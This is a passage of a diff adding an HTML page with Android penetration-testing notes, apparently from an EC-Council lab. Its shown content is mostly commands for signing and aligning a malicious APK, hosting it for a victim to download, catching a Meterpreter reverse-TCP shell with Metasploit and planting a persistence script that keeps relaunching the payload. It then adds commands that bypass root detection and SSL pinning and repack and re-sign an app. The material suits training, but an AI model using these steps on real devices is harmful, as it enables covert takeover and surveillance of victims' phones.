+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1  -keystore eccouncil.Keystore mail_temp.apk pentestandroid
+</code></pre></div><blockquote>
+<p>zipalign` is an archive alignment tool that provides important optimization to Android application (APK) files. The purpose is to ensure that all uncompressed data starts with a particular alignment relative to the start of the file. Specifically, it causes all uncompressed data within the APK, such as images or raw files, to be aligned on 4-byte boundaries. This allows all portions to be accessed directly with mmap() even if they contain binary data with alignment restrictions. The benefit is a reduction in the amount of RAM consumed when running the application. To do so:</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo su -
+zipalign -fv <span class="m">4</span> mail_temp.apk /var/www/html/mail.apk
+What <span class="k">for</span>?
+</code></pre></div><p>Start apache to host the malicious application for the victim to download;</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">service apache2 start
+</code></pre></div><p>Start <code>metasploit</code> as an attacker:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">msfconsole
+
+use exploit/multi/handler <span class="nb">set</span> payload android/meterpreter/reverse_tcp options <span class="nb">set</span> LPORT <span class="m">8888</span> <span class="nb">set</span> LHOST 192.168.72.208 <span class="nb">set</span> exitonsession <span class="nb">false</span> exploit
+</code></pre></div><p>When connected to meterpreter on the remote Android (after the victim has downloaded the malware and launched). This is for persistence, so that the user won’t need to launch the application, it’ll be launched automatically:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash 
+</span><span class="cp"></span><span class="k">while</span> <span class="nb">true</span> <span class="k">do</span> am start –user <span class="m">0</span> -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity sleep <span class="m">60</span> <span class="k">done</span>
+</code></pre></div><p>In meterpreter upload the above bash script:</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">/home/android/Downloads/Lab3.4/bc.sh /sdcard shell 
+<span class="nb">cd</span> /sdcard 
+sh bc.sh 
+</code></pre></div><p>Should look something like this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">Starting: Intent <span class="o">{</span> <span class="nv">act</span><span class="o">=</span>android.intent.action.MAIN <span class="nv">cmp</span><span class="o">=</span>com.metasploit.stage/.MainActivity <span class="nv">launchParam</span><span class="o">=</span>MultiScreenLaunchParams <span class="o">{</span> <span class="nv">mDisplayId</span><span class="o">=</span><span class="m">0</span> <span class="nv">mFlags</span><span class="o">=</span><span class="m">0</span> <span class="o">}</span> <span class="o">}</span>
+</code></pre></div><h2 id="introspy">Introspy</h2>
+<p>Launch Tracer on mobile device:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python -m introspy -p android -o output introspy-android.db
+</code></pre></div><h2 id="bypasses">Bypasses</h2>
+<h3 id="root-detect">Root-detect</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">objection -g <span class="o">[</span>package_name<span class="o">]</span> explore
+android root disable
+</code></pre></div><h3 id="ssl-pinning">SSL pinning</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">objection -g <span class="o">[</span>package_name<span class="o">]</span> explore
+android sslpinning disable
+</code></pre></div><h3 id="patch">Patch</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">apktool d <span class="o">[</span>appfolder<span class="o">]</span>
+apktool b <span class="o">[</span>appfolder<span class="o">]</span>
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize <span class="m">2048</span> -validity <span class="m">10000</span>
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore com.myapp/dist/com.myapp.apk alias_name
+</code></pre></div>
+  </div>
+</article>
+</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+    
+  </div>
+
+  <div class="sub-footer">
+  <div class="container">
+    <div class="row">
+      <div class="col-12">
+        <div class="sub-footer-inner">
+          <ul>
+            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/scripts.min.1237ff71925bb8625c97a9af8db4c54525258bedfd7c47493daaff723bea755e.js"></script>
+  
+
+  
+  
+  
+    
+  
+
+
+</body>
+
+</html>
